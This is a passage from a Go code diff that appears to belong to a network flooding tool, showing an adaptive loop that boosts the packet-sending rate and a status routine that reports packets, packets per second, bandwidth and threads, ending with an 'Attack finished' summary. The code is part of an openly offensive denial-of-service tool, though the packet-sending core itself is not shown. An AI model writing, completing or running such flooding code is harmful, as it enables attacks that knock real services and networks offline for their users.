+				if currentBW < target*0.5 {
+					boost = MAX_BOOST
+				}
+				newRate = int32(float64(currentRate) * boost)
+			}
+			
+			// Ensure minimum rate
+			if newRate < 1000 {
+				newRate = 1000
+			}
+		}
+
+		if newRate != currentRate {
+			atomic.StoreInt32(&RATE, newRate)
+		}
+	}
+}
+
+func Status() {
+	start := time.Now()
+	var lastSent uint64
+	lastTime := start
+
+	for floodRunning.Load() {
+		time.Sleep(1 * time.Second)
+		current := KIRIM.Load()
+		now := time.Now()
+		elapsed := now.Sub(lastTime).Seconds()
+		PPS := float64(current-lastSent) / elapsed
+		TTE := now.Sub(start).Seconds()
+		bytesSent := float64(current * uint64(SIZE))
+		BANDWIDTH := (bytesSent * 8 / 1000000) / TTE
+		
+		fmt.Printf("\r🚀%d 🎁%.0f 📤%.2f 🧭%.0fs Thr:%d", 
+			current, PPS, BANDWIDTH, TTE, activeThreads.Load())
+		
+		lastSent = current
+		lastTime = now
+	}
+
+	TTE := time.Since(start).Seconds()
+	total := KIRIM.Load()
+	PPS := float64(total) / TTE
+	bytesSent := float64(total * uint64(SIZE))
+	BANDWIDTH := (bytesSent * 8 / 1000000) / TTE
+
+	fmt.Printf("\n\n[+] Attack finished")
+	fmt.Printf("\nTotal packets: %d", total)
+	fmt.Printf("\nFailed packets: %d", GAGAL.Load())
+	fmt.Printf("\nAverage PPS: %.0f", PPS)
+	fmt.Printf("\nAverage bandwidth: %.2f Mbps", BANDWIDTH)
+	fmt.Printf("\nDuration: %.2f seconds\n", TTE)
 }
